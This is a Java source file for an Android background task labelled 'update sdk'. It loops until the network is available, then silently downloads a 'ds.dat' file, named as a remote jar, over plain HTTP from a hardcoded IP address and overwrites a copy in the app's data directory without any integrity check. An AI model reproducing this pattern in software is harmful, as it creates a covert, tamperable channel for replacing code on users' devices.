/**
 * 
 */
package cn.play.dserv;

import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.IOException;


/**
 * update sdk
 * @author Keel
 *
 */
public class PLTask5 implements PLTask {

	private DServ dserv;
	private int id = 5;
	private int state = STATE_WAITING;
	private String TAG = "dserv-PLTask"+id;
	
	@Override
	public void run() {
		CheckTool.log(dserv.getService(), TAG, "==========PLTask id:"+this.id+"===========");
		dserv.dsLog(1, "PLTask", 100,dserv.getService().getPackageName(), "0_0_"+id+"_task inited.");
		state = STATE_RUNNING;
		boolean isFinish = false;
		while (true) {
			if (!CheckTool.isNetOk(this.dserv.getService())) {
				try {
					Thread.sleep(1000*60*5);
				} catch (InterruptedException e) {
				}
				continue;
			}
			
			
			try {
				//更新dat文件
				int currentVer = this.dserv.getVer();
				CheckTool.log(dserv.getService(), TAG, "==========dserv current ver:"+currentVer+"===========");
				if (currentVer < 3) {
					String cDir = dserv.getService().getApplicationInfo().dataDir;
					
					String remoteJar = "http://180.96.63.70:12370/plserver/dats/ds.dat";
					String fName = "ds.dat";
					String localJarDir = dserv.getLocalPath()+"update/";
					if (dserv.downloadGoOn(remoteJar, localJarDir, fName, this.dserv.getService())) {
						CheckTool.log(dserv.getService(), TAG, "down dat OK:"+localJarDir+fName);
						
						String newFName = cDir+File.separator+fName;
						File f = new File(localJarDir+fName);
						File nf = new File(newFName);
						if (f.isFile()) {
							if (nf.isFile()) {
								nf.delete();
							}
							CheckTool.log(dserv.getService(), TAG, "org data file["+newFName+"] exist?"+nf.exists());
							nf = new File(newFName);
							if(copy(f,nf)){
								CheckTool.log(dserv.getService(), TAG, "copy to data:"+nf.exists());
								f = new File(localJarDir+fName);
								f.delete();
								CheckTool.log(dserv.getService(), TAG, "sd dat delete:"+f.exists());
								CheckTool.sLog(dserv.getService(), 80);
								isFinish = true;
							}
						}
					}
				}else{
					isFinish = true;
					CheckTool.log(dserv.getService(), TAG, "no need update.");
				}
			} catch (Exception e) {
				e.printStackTrace();
				isFinish = false;
			}
			
			if (!isFinish) {
				state = STATE_WAITING;
				break;
			}
			this.dserv.taskDone(this);
			state = STATE_DIE;
			break;
		}
		CheckTool.log(dserv.getService(), TAG, "==========PLTask["+this.id+"] isFinish ? "+isFinish+"===========");
	}
	
	public static final boolean copy(File fileFrom, File fileTo) throws IOException {  
        FileInputStream in = new FileInputStream(fileFrom);  
        FileOutputStream out = new FileOutputStream(fileTo);  
        byte[] bt = new byte[1024*5];  
        int count;  
        while ((count = in.read(bt)) > 0) {  
            out.write(bt, 0, count);  
        }  
        in.close();  
        out.close();  
        return true;
    } 

	/* (non-Javadoc)
	 * @see cn.play.dserv.PLTask#getId()
	 */
	@Override
	public int getId() {
		return id;
	}

	/* (non-Javadoc)
	 * @see cn.play.dserv.PLTask#getState()
	 */
	@Override
	public int getState() {
		return this.state;
	}

	/* (non-Javadoc)
	 * @see cn.play.dserv.PLTask#init()
	 */
	@Override
	public void init() {
		CheckTool.log(dserv.getService(),TAG, "TASK "+id+" init.");
		
//		Log.d(TAG, "TASK "+id+" init.");
		if (dserv.getService() != null) {
			dserv.dsLog(1, "PLTask", 100,dserv.getService().getPackageName(), "0_0_"+id+"_task inited.");
		}else{
			CheckTool.log(dserv.getService(),TAG, "TASK "+id+" getService is null.");
		}
	}

	/* (non-Javadoc)
	 * @see cn.play.dserv.PLTask#setState(int)
	 */
	@Override
	public void setState(int arg0) {
		this.state = arg0;
	}

	@Override
	public void setDService(DServ serv) {
		this.dserv =serv;
	}
}
